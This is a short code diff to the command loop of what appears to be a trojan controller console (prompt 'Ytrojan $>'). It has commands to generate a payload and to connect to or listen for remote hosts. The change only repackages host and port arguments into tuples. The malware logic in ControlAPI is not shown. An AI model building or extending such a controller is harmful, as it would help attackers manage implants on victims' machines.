@@ -17,12 +17,12 @@ if "__main__" == __name__:
         cmd = input("Ytrojan $>").split()
         if cmd[0] == "generate":
           parameters = input("parameters $>").split()
-          ControlAPI.generate(int(cmd[1]),cmd[2],cmd[3],int(cmd[4]),parameters)
+          ControlAPI.generate(int(cmd[1]),cmd[2],tuple([cmd[3],int(cmd[4])]),parameters)
         elif cmd[0] == "connect":
-          control = ControlAPI.Control(cmd[1],int(cmd[2]))
+          control = ControlAPI.Control(tuple([cmd[1],int(cmd[2])]))
           control.connect()
         elif cmd[0] == "listen":
-          control = ControlAPI.Control(cmd[1],int(cmd[2]))
+          control = ControlAPI.Control(tuple([cmd[1],int(cmd[2])]))
           control.listen()
         elif cmd[0] == "exit":
           exit(0)
